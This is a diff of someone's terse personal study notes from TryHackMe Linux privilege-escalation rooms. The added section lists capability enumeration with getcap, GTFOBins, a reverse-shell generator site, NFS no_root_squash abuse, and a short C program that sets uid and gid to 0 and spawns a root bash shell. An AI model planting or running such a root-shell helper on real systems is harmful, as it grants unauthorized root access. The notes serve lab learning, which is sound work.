@@ -1,7 +1,7 @@
 # R
 
 * Remember for web/general/security
-* .todo: metasploit dns discord
+* .todo: dns discord
 * web general | terminology | URL may have to be moved
 
 <hr>
@@ -37,6 +37,23 @@ https://tryhackme.com/room/linprivesc
   * Can encrypt, may bypass an IDS: https://tryhackme.com/room/introtoshells
 * Socat: transfer the socat binary
 * Reverse shells/... note lasty
+
+https://tryhackme.com/room/linprivesc
+=> capabilities
+=> `getcap -r / 2>/dev/null`
+=> gtfobins
+* https://www.revshells.com/ (sh => bash)
+* if no_root_squash present
+* Another alternative to this program, is to create a suite file with a copy of bash.
+
+```c
+int main() {
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
+```
 
 <hr>
 
